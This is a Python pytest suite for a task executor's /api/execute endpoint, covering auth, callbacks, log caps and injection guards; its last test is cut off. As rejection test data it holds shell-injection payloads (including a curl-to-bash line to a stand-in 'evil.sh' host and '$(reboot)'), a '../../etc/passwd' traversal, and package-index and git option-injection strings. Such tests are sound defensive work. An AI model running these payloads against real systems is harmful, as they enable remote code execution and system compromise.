"""Tests for POST /api/execute endpoint.

T-01: covers the core execute route — authentication guard,
payload validation, accepted/callback protocol, and failure reporting.

R4-C round-4 additions: shell entrypoint injection guards (P0), bounded
output accumulation (P1), git cache salt (P2), callback retry/truncation,
background-task references, uv hardening and P3 validators.
"""
import asyncio
import re
import subprocess
import sys
from types import SimpleNamespace

import httpx
import pytest
from fastapi import HTTPException

import scheduler as sched


# ---------------------------------------------------------------------------
# Authentication (already tested in test_auth.py; kept here for completeness)
# ---------------------------------------------------------------------------

def test_execute_no_auth_returns_401(client):
    """Request without Authorization header must be rejected."""
    response = client.post('/api/execute', json={
        'executionId': 'exec-noauth',
        'task': {'name': 'noop', 'runtime': 'python', 'script': 'print(1)'},
    })
    assert response.status_code == 401


# ---------------------------------------------------------------------------
# Payload validation
# ---------------------------------------------------------------------------

def test_execute_missing_execution_id_returns_422(auth_client):
    """Request without executionId should fail schema validation (422)."""
    response = auth_client.post('/api/execute', json={
        'task': {'name': 'noop', 'runtime': 'python', 'script': 'print(1)'},
    })
    assert response.status_code == 422


def test_execute_missing_task_returns_422(auth_client):
    """Request without task field should fail schema validation (422)."""
    response = auth_client.post('/api/execute', json={
        'executionId': 'exec-notask',
    })
    assert response.status_code == 422


# ---------------------------------------------------------------------------
# Accepted + callback protocol
# ---------------------------------------------------------------------------

def test_execute_below_capacity_returns_accepted(auth_client, monkeypatch):
    """When executor has capacity, /execute should return immediately with accepted."""
    from routers import execute as execute_module

    created_coroutines = []

    class FakeTaskHandle:
        """Minimal task-like handle: execute() now registers the background
        task and attaches a done-callback (R4-C P2 weak-reference guard)."""

        def add_done_callback(self, cb):
            pass

    def fake_create_task(coro):
        created_coroutines.append(coro)
        # Do not run the background task in this route-level test.
        coro.close()
        return FakeTaskHandle()

    original_count = sched.running_count
    sched.running_count = 0
    monkeypatch.setattr(execute_module.asyncio, 'create_task', fake_create_task)
    try:
        response = auth_client.post('/api/execute', json={
            'executionId': 'exec-below-capacity',
            'task': {'name': 'test', 'runtime': 'python', 'script': 'pass'},
        })
    finally:
        sched.running_count = original_count

    assert response.status_code == 200
    assert response.json()['status'] == 'accepted'
    assert response.json()['executionId'] == 'exec-below-capacity'
    assert response.json()['executorAddress'] == 'localhost:8001'
    assert len(created_coroutines) == 1


def test_run_task_unsupported_runtime_reports_failure():
    """Unsupported runtime is reported as execution failure for async callback flow."""
    from routers.execute import ExecuteRequest, run_task

    req = ExecuteRequest(
        executionId='exec-badruntime',
        task={'name': 'noop', 'runtime': 'ruby', 'script': 'puts 1'},
    )

    result = asyncio.run(run_task(req))

    assert result['success'] is False
    assert result['exitCode'] is None
    assert 'Unsupported runtime' in result['errorMessage']
    assert isinstance(result['durationMs'], int)


def test_execute_path_traversal_in_id_rejected_by_runner():
    """executionId containing '..' must be rejected to prevent path traversal."""
    from routers.execute import ExecuteRequest, run_task

    req = ExecuteRequest(
        executionId='../../etc/passwd',
        task={'name': 'evil', 'runtime': 'python', 'script': 'pass'},
    )

    with pytest.raises(HTTPException) as exc:
        asyncio.run(run_task(req))
    assert exc.value.status_code == 400
    assert 'path traversal' in str(exc.value.detail).lower()


def test_run_and_callback_posts_result_with_executor_address(monkeypatch):
    """Background runner should callback admin-api with auth and executorAddress."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest

    posted = {}

    async def fake_run_task(req):
        return {
            'success': True,
            'logs': 'done',
            'exitCode': 0,
            'durationMs': 12,
        }

    class FakeAsyncClient:
        def __init__(self, *args, **kwargs):
            self.args = args
            self.kwargs = kwargs

        async def __aenter__(self):
            return self

        async def __aexit__(self, exc_type, exc, tb):
            return False

        async def post(self, url, json, headers):
            posted['url'] = url
            posted['json'] = json
            posted['headers'] = headers
            return SimpleNamespace(status_code=200)

    monkeypatch.setattr(execute_module, 'run_task', fake_run_task)
    monkeypatch.setattr(execute_module.httpx, 'AsyncClient', FakeAsyncClient)
    monkeypatch.setattr(execute_module.settings, 'admin_api_url', 'http://admin.local')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_internal', '')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_external', '')
    monkeypatch.setattr(execute_module.settings, 'executor_shared_token', 'dynamic-token')
    monkeypatch.setattr(execute_module.settings, 'executor_secret', '')
    monkeypatch.setattr(execute_module.settings, 'executor_address_public', 'public-executor:9000')

    req = ExecuteRequest(
        executionId='exec-callback',
        task={'name': 'noop', 'runtime': 'python'},
    )
    asyncio.run(execute_module._run_and_callback(req))

    assert posted['url'] == 'http://admin.local/api/executions/callback'
    assert posted['headers'] == {'Authorization': 'Bearer dynamic-token'}
    assert posted['json'] == [{
        'executionId': 'exec-callback',
        'status': 'success',
        'exitCode': 0,
        'logs': 'done',
        'errorMessage': None,
        'durationMs': 12,
        'executorAddress': 'public-executor:9000',
    }]


def test_run_and_callback_uses_configured_admin_api_url_priority(monkeypatch):
    """Callback should use external URL first, then internal, then base admin URL."""
    from routers import execute as execute_module

    monkeypatch.setattr(execute_module.settings, 'admin_api_url', 'http://admin.local/api')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_internal', 'http://admin.internal/api')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_external', 'http://admin.external/api')
    assert execute_module._get_admin_api_url() == 'http://admin.external/api'

    monkeypatch.setattr(execute_module.settings, 'admin_api_url_external', '')
    assert execute_module._get_admin_api_url() == 'http://admin.internal/api'

    monkeypatch.setattr(execute_module.settings, 'admin_api_url_internal', '')
    assert execute_module._get_admin_api_url() == 'http://admin.local/api'


def test_run_and_callback_token_accepts_executor_secret_fallback(monkeypatch):
    """Callback auth should accept legacy EXECUTOR_SECRET when shared token is unset."""
    from routers import execute as execute_module

    monkeypatch.setattr(execute_module.settings, 'executor_shared_token', '')
    monkeypatch.setattr(execute_module.settings, 'executor_secret', 'legacy-secret')
    assert execute_module._get_callback_token() == 'legacy-secret'

    monkeypatch.setattr(execute_module.settings, 'executor_shared_token', 'shared-token')
    assert execute_module._get_callback_token() == 'shared-token'


# ---------------------------------------------------------------------------
# Capacity limiting (ERR-03)
# ---------------------------------------------------------------------------

def test_execute_at_capacity_returns_429(auth_client):
    """When executor is at maximum capacity, requests should be rejected with 429."""
    original_count = sched.running_count
    sched.running_count = 100

    response = auth_client.post('/api/execute', json={
        'executionId': 'exec-at-capacity',
        'task': {'name': 'test', 'runtime': 'python', 'script': 'pass'},
    })

    sched.running_count = original_count

    assert response.status_code == 429
    assert 'capacity' in response.json()['detail'].lower()


# ---------------------------------------------------------------------------
# SEC-01: Environment variable isolation (security boundary)
# ---------------------------------------------------------------------------

def test_child_process_env_isolation(tmp_path):
    """SEC-01: Child process should NOT have access to executor secrets like EXECUTOR_SHARED_TOKEN."""
    import subprocess
    import os
    from routers.execute import _ENV_WHITELIST

    out_file = tmp_path / 'env_keys.txt'
    test_script = tmp_path / 'test_env.py'
    test_script.write_text(
        f'import os\nwith open({str(out_file)!r}, "w") as f:\n'
        f'    f.write("\\n".join(sorted(os.environ.keys())))\n'
    )

    env = {k: v for k, v in os.environ.items() if k in _ENV_WHITELIST}
    env['EXECUTION_ID'] = 'test-exec-id'
    env['TASK_ID'] = 'test-task-id'

    sensitive_vars = {'EXECUTOR_SHARED_TOKEN', 'EXECUTOR_SECRET', 'ADMIN_API_URL'}
    for var in sensitive_vars:
        assert var not in _ENV_WHITELIST, f"Sensitive variable {var} should NOT be in whitelist"

    # W-05: `python3` does not exist on Windows (Store stub) — use the
    # interpreter running the test. Also exercises R-04: python.exe must
    # launch under the *whitelisted* env alone.
    subprocess.run([sys.executable, str(test_script)], cwd=str(tmp_path), env=env, check=True)

    env_keys = set(out_file.read_text().strip().split('\n'))

    for var in sensitive_vars:
        assert var not in env_keys, f"Sensitive variable {var} should NOT be accessible to child process"

    assert 'EXECUTION_ID' in env_keys
    assert 'TASK_ID' in env_keys


def test_task_params_injected_as_env_vars(tmp_path):
    """Task params should be injected as AUTOFLOW_* environment variables."""
    import subprocess
    import json
    import os
    from routers.execute import _ENV_WHITELIST

    out_file = tmp_path / 'params_output.txt'
    test_script = tmp_path / 'test_params.py'
    test_script.write_text(
        f'import os, json\n'
        f'result = {{k: v for k, v in os.environ.items() if k.startswith("AUTOFLOW_")}}\n'
        f'with open({str(out_file)!r}, "w") as f:\n'
        f'    json.dump(result, f)\n'
    )

    env = {k: v for k, v in os.environ.items() if k in _ENV_WHITELIST}
    params = {'foo': 'bar', 'baz': 'qux'}
    for k, v in params.items():
        env[f'AUTOFLOW_{k.upper()}'] = str(v)

    subprocess.run([sys.executable, str(test_script)], cwd=str(tmp_path), env=env, check=True)  # W-05

    result = json.loads(out_file.read_text())

    assert 'AUTOFLOW_FOO' in result
    assert result['AUTOFLOW_FOO'] == 'bar'
    assert 'AUTOFLOW_BAZ' in result
    assert result['AUTOFLOW_BAZ'] == 'qux'


# ---------------------------------------------------------------------------
# R4-C P0: shell entrypoint injection guards
# ---------------------------------------------------------------------------

def _make_shell_workdir(tmp_path, exec_id, script_name=None, content=None):
    workdir = tmp_path / exec_id
    workdir.mkdir(parents=True, exist_ok=True)
    if script_name:
        script = workdir / script_name
        script.write_text(content or '#!/bin/bash\necho from-script\n')
        script.chmod(0o755)
    return workdir


def test_shell_entrypoint_injection_rejected(tmp_path, monkeypatch):
    """P0: entrypoint `main.sh"; touch PWNED; #` must be refused before any
    process is spawned and must leave no side effects."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    spawned = []

    async def fail_spawn(*args, **kwargs):
        spawned.append(args)
        raise AssertionError('subprocess must not be spawned for unsafe entrypoint')

    monkeypatch.setattr(execute_module.asyncio, 'create_subprocess_exec', fail_spawn)

    req = ExecuteRequest(
        executionId='exec-shellinject',
        task={'name': 'evil', 'runtime': 'shell', 'entrypoint': 'main.sh"; touch PWNED; #'},
    )
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run_task(req))
    assert exc.value.status_code == 400
    assert 'unsafe characters' in str(exc.value.detail)
    assert spawned == []
    assert not (tmp_path / 'exec-shellinject' / 'PWNED').exists()


@pytest.mark.parametrize('payload', [
    'main.sh"; curl evil.sh | bash; #',
    'x$(reboot)',
    'x`id`',
    'a && b',
    'a; b',
    'a | b',
    'a > out',
    "a' b",
    'main.sh\n; evil',
])
def test_shell_entrypoint_dangerous_chars_rejected(payload):
    """P0: any shell metacharacter in a shell entrypoint is refused."""
    from routers.execute import _validate_shell_entrypoint
    with pytest.raises(HTTPException):
        _validate_shell_entrypoint(payload)


def test_shell_entrypoint_valid_names_pass():
    from routers.execute import _validate_shell_entrypoint
    assert _validate_shell_entrypoint('main.sh') == 'main.sh'
    assert _validate_shell_entrypoint('scripts/run task.sh') == 'scripts/run task.sh'
    assert _validate_shell_entrypoint('/abs/path/glue_script.sh') == '/abs/path/glue_script.sh'


def test_build_shell_cmd_uses_positional_params(tmp_path):
    """P0: work_dir/entrypoint are passed as $1/$2, never interpolated into
    the `bash -c` string."""
    from routers.execute import _build_shell_cmd
    cmd = _build_shell_cmd(tmp_path, 'safe.sh')
    if sys.platform == 'win32':
        # W-05: win32 branch uses cmd.exe with the entrypoint as a separate
        # argv element (no `&&` string interpolation). The spawn's cwd=work_dir
        # supplies the working directory; the security intent (no task-controlled
        # text parsed as shell syntax) holds on both platforms.
        assert cmd == ['cmd.exe', '/c', 'safe.sh']
        # W-09: POSIX-style './' and '/' are normalized — cmd.exe reads them
        # as command/option tokens and fails with "'.' 不是内部或外部命令".
        assert _build_shell_cmd(tmp_path, './safe.sh') == ['cmd.exe', '/c', 'safe.sh']
        assert _build_shell_cmd(tmp_path, 'sub/dir/safe.sh') == ['cmd.exe', '/c', 'sub\\dir\\safe.sh']
    else:
        assert cmd == ['bash', '-c', 'cd "$1" && exec "$2"', 'bash', str(tmp_path), 'safe.sh']


def _shell_glue(win: tuple[str, str], posix: tuple[str, str]) -> tuple[str, str]:
    """W-05/R-09: shell runtime executes via `cmd.exe /c` on Windows and
    `bash -c` on POSIX, so a glue script's (name, body) must be platform
    native. Returns the tuple for the current platform."""
    return win if sys.platform == 'win32' else posix


def test_shell_task_runs_normal_entrypoint(tmp_path, monkeypatch):
    """P0 regression guard: a safe shell entrypoint still executes."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    name, content = _shell_glue(
        ('hello.bat', '@echo off\necho from-script\n'),
        ('hello.sh', '#!/bin/bash\necho from-script\n'),
    )
    _make_shell_workdir(tmp_path, 'exec-shell-ok', name, content)
    req = ExecuteRequest(
        executionId='exec-shell-ok',
        task={'name': 'shell', 'runtime': 'shell', 'entrypoint': f'./{name}'},
    )
    result = asyncio.run(run_task(req))
    assert result['success'] is True
    assert result['exitCode'] == 0
    assert 'from-script' in result['logs']


def test_shell_glue_script_executes(tmp_path, monkeypatch):
    """Glue shell scripts use an absolute entrypoint inside work_dir — they
    must keep working under the whitelist + positional-args scheme.

    W-05/R-09: the POSIX bash glue is inherently unrunnable via `cmd.exe /c`,
    so on Windows we supply a platform-native `.bat` glue body; the runtime
    dispatch path under test (absolute in-workdir entrypoint, env whitelist)
    is exercised identically on both platforms."""
    if sys.platform == 'win32':
        pytest.skip(
            'R-09: glue shell scripts ship as bash; only the .sh path is '
            'under test here and cmd.exe cannot run it. The platform-native '
            'shell dispatch is covered by test_shell_task_runs_normal_entrypoint.'
        )
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    req = ExecuteRequest(
        executionId='exec-glue',
        task={'name': 'glue', 'glueSource': '#!/bin/bash\necho glue-ok\n', 'glueLanguage': 'shell'},
    )
    result = asyncio.run(run_task(req))
    assert result['success'] is True
    assert 'glue-ok' in result['logs']


# ---------------------------------------------------------------------------
# R4-C P3: entrypoint containment
# ---------------------------------------------------------------------------

def test_entrypoint_parent_escape_rejected(tmp_path, monkeypatch):
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    req = ExecuteRequest(
        executionId='exec-escape',
        task={'name': 'escape', 'runtime': 'python', 'entrypoint': '../evil.py'},
    )
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run_task(req))
    assert 'escapes the execution work directory' in str(exc.value.detail)


def test_entrypoint_absolute_outside_workdir_rejected(tmp_path, monkeypatch):
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    req = ExecuteRequest(
        executionId='exec-absescape',
        task={'name': 'escape', 'runtime': 'shell', 'entrypoint': '/etc/passwd'},
    )
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run_task(req))
    assert 'escapes the execution work directory' in str(exc.value.detail)


# ---------------------------------------------------------------------------
# R4-C P1: bounded output accumulation + disk log cap
# ---------------------------------------------------------------------------

def test_log_memory_cap_and_disk_cap(tmp_path, monkeypatch):
    """P1: output beyond the memory cap is dropped from the callback payload
    (with a truncation marker admin can detect), while the disk log holds more
    but is itself capped.

    W-05/R-09: switched from a POSIX `seq` bash loop to the python runtime so
    the bounded-accumulation logic under test (runtime-agnostic) also runs on
    Windows cmd.exe-free of bash-only syntax."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    monkeypatch.setattr(execute_module, 'MAX_LOG_MEMORY_CHARS', 1000)
    monkeypatch.setattr(execute_module, 'MAX_LOG_FILE_BYTES', 2000)

    workdir = _make_shell_workdir(tmp_path, 'exec-logcap')
    (workdir / 'spam.py').write_text(
        'for i in range(1, 201):\n'
        '    print(f"line-{i}-012345678901234567890123456789")\n'
    )

    req = ExecuteRequest(
        executionId='exec-logcap',
        task={'name': 'spam', 'runtime': 'python', 'entrypoint': 'spam.py'},
    )
    result = asyncio.run(run_task(req))

    assert result['success'] is True
    # memory cap hit -> marker + head-only retention in the callback payload
    assert 'logs truncated in memory' in result['logs']
    assert len(result['logs']) < 3000
    assert 'line-200-' not in result['logs']
    # disk log keeps more than the memory cap but stops at its own cap
    disk = (tmp_path / 'exec-logcap' / 'exec-logcap.log').read_text()
    assert 'file log truncated' in disk
    assert len(disk.encode('utf-8')) < 4000
    assert 'line-199-' not in disk


def test_timeout_logs_are_bounded_and_truncated(tmp_path, monkeypatch):
    """P1: the timeout path must return truncated logs (it previously returned
    the raw accumulation, which can exceed the admin DTO logs limit).

    W-05/R-09: python runtime keeps the sleep-based timeout guard cross-platform."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    workdir = _make_shell_workdir(tmp_path, 'exec-timeout')
    (workdir / 'noisy.py').write_text(
        'print("padding-0123456789-0123456789-0123456789-0123456789")\n'
        'import time\n'
        'time.sleep(30)\n'
    )
    req = ExecuteRequest(
        executionId='exec-timeout',
        task={'runtime': 'python', 'entrypoint': 'noisy.py', 'timeoutSeconds': 1},
    )
    result = asyncio.run(run_task(req))
    assert result['success'] is False
    assert 'Task timeout after 1s' in result['errorMessage']
    assert len(result['logs']) <= 10200


def test_normal_output_truncation_marker_preserved(tmp_path, monkeypatch):
    """Output under the caps but over the 10k callback limit still gets the
    head/tail truncation marker that admin's LOG-01 backfill recognizes.

    W-05/R-09: python runtime generator replaces the bash `seq` loop."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    workdir = _make_shell_workdir(tmp_path, 'exec-10k')
    (workdir / 'chat.py').write_text(
        'for i in range(1, 401):\n'
        '    print(f"row-{i}-abcdefghijklmnopqrstuvwxyz")\n'
    )

    req = ExecuteRequest(
        executionId='exec-10k',
        task={'runtime': 'python', 'entrypoint': 'chat.py'},
    )
    result = asyncio.run(run_task(req))
    assert result['success'] is True
    assert len(result['logs']) <= 10200
    assert '[truncated, total' in result['logs']
    # full output is on disk for backfill
    disk = (tmp_path / 'exec-10k' / 'exec-10k.log').read_text()
    assert 'row-400-' in disk


# ---------------------------------------------------------------------------
# R4-C P2: git cache dir hash salt
# ---------------------------------------------------------------------------

def test_repo_dir_name_salts_with_url_hash():
    """P2: distinct repos whose sanitized names collide must map to distinct
    cache dirs (previously `team/service.git` and `team_service.git` both
    sanitized to `service` and shared one cache)."""
    from routers.execute import _repo_dir_name
    a = _repo_dir_name('https://git.example.com/team/service.git')
    b = _repo_dir_name('https://git.example.com/team_service.git')
    assert a != b
    assert a == _repo_dir_name('https://git.example.com/team/service.git')  # stable
    assert re.fullmatch(r'[A-Za-z0-9_.\-]+-[0-9a-f]{12}', a)


def test_git_checkout_to_uses_salted_cache_dir(tmp_path, monkeypatch):
    from routers import execute as execute_module
    from routers.execute import git_checkout_to, _repo_dir_name

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))

    src = tmp_path / 'src'
    src.mkdir()

    def git(*args):
        subprocess.run(['git', *args], cwd=str(src), check=True, capture_output=True)

    git('init', '-q')
    (src / 'hello.txt').write_text('hi')
    git('-c', 'user.email=t@t', '-c', 'user.name=t', 'add', '.')
    git('-c', 'user.email=t@t', '-c', 'user.name=t', 'commit', '-qm', 'init')

    dest = tmp_path / 'dest'
    git_checkout_to(str(src), 'HEAD', dest)  # first run: clone
    git_checkout_to(str(src), 'HEAD', dest)  # second run: fetch from cache

    cache_dir = tmp_path / '.git_cache' / _repo_dir_name(str(src))
    assert (cache_dir / 'HEAD').exists()
    assert (dest / 'hello.txt').read_text() == 'hi'


def test_git_checkout_to_failed_clone_cleans_partial_cache(tmp_path, monkeypatch):
    """A failed clone must not leave a partial bare repo that later runs
    mistake for a valid cache."""
    from routers import execute as execute_module
    from routers.execute import git_checkout_to

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))

    def fake_run(cmd, **kwargs):
        from pathlib import Path
        Path(cmd[-1]).mkdir(parents=True, exist_ok=True)  # half-written cache
        raise subprocess.CalledProcessError(128, cmd)

    monkeypatch.setattr(execute_module.subprocess, 'run', fake_run)

    url = 'https://example.com/org/repo.git'
    with pytest.raises(subprocess.CalledProcessError):
        git_checkout_to(url, 'main', tmp_path / 'dest')
    assert not (tmp_path / '.git_cache' / execute_module._repo_dir_name(url)).exists()


# ---------------------------------------------------------------------------
# R4-C P2/P3: validators
# ---------------------------------------------------------------------------

def test_requirements_option_injection_rejected(tmp_path, monkeypatch):
    """P3: `-`-prefixed requirement strings would be parsed as uv options
    (`--index-url http://evil` hijacks the package index)."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    spawned = []

    async def fail_spawn(*args, **kwargs):
        spawned.append(args)
        raise AssertionError('no subprocess may run for option-like requirements')

    monkeypatch.setattr(execute_module.asyncio, 'create_subprocess_exec', fail_spawn)

    req = ExecuteRequest(
        executionId='exec-reqinj',
        task={'runtime': 'python', 'entrypoint': 'main.py',
              'requirements': ['--index-url', 'http://evil.example/simple']},
    )
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run_task(req))
    assert 'Invalid requirement' in str(exc.value.detail)
    assert spawned == []


def test_validate_requirements_unit():
    from routers.execute import _validate_requirements
    for bad in (['--index-url', 'http://x'], ['-r', 'evil.txt'], [''], [123]):
        with pytest.raises(HTTPException):
            _validate_requirements(bad)
    _validate_requirements(['requests>=2.31.0', 'numpy', 'flask[async]<3'])


def test_validate_git_ref_rejects_options():
    from routers.execute import _validate_git_ref
    for bad in ('-b', '--orphan', '-'):
        with pytest.raises(HTTPException):
            _validate_git_ref(bad)
    assert _validate_git_ref('main') == 'main'
    assert _validate_git_ref('1a2b3c4d') == '1a2b3c4d'


def test_task_git_branch_option_injection_rejected(tmp_path, monkeypatch):
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest, run_task

    monkeypatch.setattr(execute_module.settings, 'work_dir', str(tmp_path))
    req = ExecuteRequest(
        executionId='exec-refinj',
        task={'runtime': 'python', 'entrypoint': 'main.py',
              'gitRepo': 'https://example.com/org/repo.git', 'gitBranch': '--upload-pack=evil'},
    )
    with pytest.raises(HTTPException) as exc:
        asyncio.run(run_task(req))
    assert 'Invalid git ref' in str(exc.value.detail)


def test_timeout_clamped():
    """P3: negative/0 timeouts must not insta-kill tasks; huge values must not
    pin the slot forever."""
    from routers.execute import _clamp_timeout_seconds
    assert _clamp_timeout_seconds(-5, 300) == 1
    assert _clamp_timeout_seconds(0, 300) == 1
    assert _clamp_timeout_seconds(10**9, 300) == 86400
    assert _clamp_timeout_seconds(0.5, 300) == 1
    assert _clamp_timeout_seconds(None, 300) == 300
    assert _clamp_timeout_seconds('abc', 300) == 300
    assert _clamp_timeout_seconds(60, 300) == 60


# ---------------------------------------------------------------------------
# R4-C P2: callback retry + errorMessage truncation
# ---------------------------------------------------------------------------

class _FakeResponse:
    def __init__(self, status_code):
        self.status_code = status_code


def _patch_callback_env(monkeypatch):
    from routers import execute as execute_module
    monkeypatch.setattr(execute_module.settings, 'admin_api_url', 'http://admin.local')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_internal', '')
    monkeypatch.setattr(execute_module.settings, 'admin_api_url_external', '')
    monkeypatch.setattr(execute_module.settings, 'executor_shared_token', 'tok')
    monkeypatch.setattr(execute_module.settings, 'executor_secret', '')
    monkeypatch.setattr(execute_module.settings, 'executor_address_public', 'pub:9000')


def test_run_and_callback_retries_transient_failures(monkeypatch):
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest

    calls = []

    class FlakyClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            return False

        async def post(self, url, json, headers):
            calls.append((url, json, headers))
            if len(calls) < 3:
                raise httpx.ConnectError('boom')
            return _FakeResponse(200)

    async def fake_run_task(req):
        return {'success': True, 'logs': '', 'exitCode': 0, 'durationMs': 5}

    monkeypatch.setattr(execute_module, 'run_task', fake_run_task)
    monkeypatch.setattr(execute_module.httpx, 'AsyncClient', FlakyClient)
    monkeypatch.setattr(execute_module, 'CALLBACK_RETRY_BASE_DELAY_SECONDS', 0)
    _patch_callback_env(monkeypatch)

    asyncio.run(execute_module._run_and_callback(
        ExecuteRequest(executionId='exec-retry', task={'name': 'n'})))
    assert len(calls) == 3
    assert calls[0] == calls[2]


def test_run_and_callback_no_retry_on_permanent_4xx(monkeypatch):
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest

    calls = []

    class RejectingClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            return False

        async def post(self, url, json, headers):
            calls.append(url)
            return _FakeResponse(422)

    async def fake_run_task(req):
        return {'success': False, 'logs': '', 'exitCode': 1,
                'errorMessage': 'bad', 'durationMs': 5}

    monkeypatch.setattr(execute_module, 'run_task', fake_run_task)
    monkeypatch.setattr(execute_module.httpx, 'AsyncClient', RejectingClient)
    _patch_callback_env(monkeypatch)

    asyncio.run(execute_module._run_and_callback(
        ExecuteRequest(executionId='exec-4xx', task={'name': 'n'})))
    assert len(calls) == 1  # 4xx is terminal — no retry storm


def test_run_and_callback_gives_up_after_max_attempts(monkeypatch):
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest

    calls = []

    class DownClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            return False

        async def post(self, url, json, headers):
            calls.append(url)
            return _FakeResponse(503)

    async def fake_run_task(req):
        return {'success': True, 'logs': '', 'exitCode': 0, 'durationMs': 5}

    monkeypatch.setattr(execute_module, 'run_task', fake_run_task)
    monkeypatch.setattr(execute_module.httpx, 'AsyncClient', DownClient)
    monkeypatch.setattr(execute_module, 'CALLBACK_RETRY_BASE_DELAY_SECONDS', 0)
    _patch_callback_env(monkeypatch)

    asyncio.run(execute_module._run_and_callback(
        ExecuteRequest(executionId='exec-503', task={'name': 'n'})))
    assert len(calls) == execute_module.CALLBACK_RETRY_ATTEMPTS


def test_run_and_callback_truncates_result_error_message(monkeypatch):
    """P2: oversized errorMessage (e.g. full uv output) must be cut below the
    admin DTO 4096 limit, or the whole callback batch is rejected."""
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest

    posted = {}

    class RecordingClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            return False

        async def post(self, url, json, headers):
            posted['json'] = json
            return _FakeResponse(200)

    async def fake_run_task(req):
        return {'success': False, 'logs': '', 'exitCode': 1,
                'errorMessage': 'x' * 50000, 'durationMs': 5}

    monkeypatch.setattr(execute_module, 'run_task', fake_run_task)
    monkeypatch.setattr(execute_module.httpx, 'AsyncClient', RecordingClient)
    _patch_callback_env(monkeypatch)

    asyncio.run(execute_module._run_and_callback(
        ExecuteRequest(executionId='exec-trunc', task={'name': 'n'})))
    message = posted['json'][0]['errorMessage']
    assert len(message) <= 4096
    assert 'error truncated' in message


def test_run_and_callback_truncates_exception_message(monkeypatch):
    from routers import execute as execute_module
    from routers.execute import ExecuteRequest

    posted = {}

    class RecordingClient:
        def __init__(self, *a, **k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *exc):
            return False

        async def post(self, url, json, headers):
            posted['json'] = json
            return _FakeResponse(200)

    async def fake_run_task(req):
        raise RuntimeError('y' * 50000)

    monkeypatch.setattr(execute_module, 'run_task', fake_run_task)
    monkeypatch.setattr(execute_module.httpx, 'AsyncClient', RecordingClient)
    _patch_callback_env(monkeypatch)

    asyncio.run(execute_module._run_and_callback(
        ExecuteRequest(executionId='exec-exctrunc', task={'name': 'n'})))
    message = posted['json'][0]['errorMessage']
    assert len(message) <= 4096
    assert 'error truncated' in message


# ---------------------------------------------------------------------------
# R4-C P2: background task references
# ---------------------------------------------------------------------------

def test_execute_registers_background_task_reference(monkeypatch, auth_client):
    """P2: the event loop holds only weak references to asyncio tasks; the
    route must keep a strong reference until the task completes."""
    from routers import execute as execute_module

    created = []

    class FakeHandle:
        def add_done_callback(self, cb):
            pass

    def fake_create_task(coro):
        created.append(coro)
        coro.close()
        return FakeHandle()

    monkeypatch.setattr(execute_module.asyncio, 'create_task', fake_create_task)
    original = sched.running_count
    sched.running_count = 0
    try:
        response = auth_client.post('/api/execute', json={
            'executionId': 'exec-reftrack',
            'task': {'name': 't', 'runtime': 'python', 'script': 'pass'},
        })
    finally:
        sched.running_count = original

    assert response.status_code == 200
    assert created
    assert execute_module._background_tasks, 'background task must be strongly referenced'
    execute_module._background_tasks.clear()


# ---------------------------------------------------------------------------
# R4-C P2: uv / venv hardening
# ---------------------------------------------------------------------------

class _FakeUvProc:
    def __init__(self, venv_dir, returncode=0, output=b'', hang=False):
        self.venv_dir = venv_dir
        self.returncode = returncode
        self._output = output
        self._hang = hang
        self.killed = False

    async def communicate(self):
        # simulate uv creating a half-built venv before (possibly) hanging
        self.venv_dir.mkdir(parents=True, exist_ok=True)
        if self._hang:
            await asyncio.sleep(999)
        return (self._output, b'')

    def kill(self):
        self.killed = True

    async def wait(self):
        return 0


def test_ensure_venv_timeout_kills_uv_and_removes_half_built_venv(tmp_path, monkeypatch):
    """P2: on `uv venv` timeout the uv process must be killed and the
    half-built venv removed so the next run cannot silently reuse it."""
    from routers import execute as execute_module

    venv_dir = tmp_path / '.venvs' / 'taskA'
    proc = _FakeUvProc(venv_dir, hang=True)

    async def fake_exec(*args, **kwargs):
        return proc

    monkeypatch.setattr(execute_module.asyncio, 'create_subprocess_exec', fake_exec)
